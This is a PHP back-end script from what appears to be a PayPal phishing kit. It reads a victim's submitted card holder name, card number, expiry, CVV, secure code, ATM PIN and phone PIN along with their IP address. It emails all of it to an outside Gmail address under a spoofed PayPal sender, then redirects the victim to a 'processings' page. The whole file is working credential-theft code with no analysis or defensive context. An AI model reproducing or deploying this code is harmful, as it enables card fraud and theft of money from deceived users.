<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------paypal Info-----------------------\n";
$message .= "Card holder Name             : ".$_POST['formtext1']."\n";
$message .= "Card Number             : ".$_POST['formtext2']."\n";
$message .= "Expiration month             : ".$_POST['formselect1']."\n";
$message .= "Expiration year             : ".$_POST['formselect2']."\n";
$message .= "Card Verification Number            : ".$_POST['formtext3']."\n";
$message .= "Secure Code           : ".$_POST['formtext4']."\n";
$message .= "ATM Pin           : ".$_POST['formtext5']."\n";
$message .= "Phone Pin           : ".$_POST['formtext6']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY Unknown-------------\n";
$send = "fudtools@gmail.com";
$subject = "Result from $ip";
$headers = "From: PayPal<customer-support@mrs>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: processings.html");

	 
?>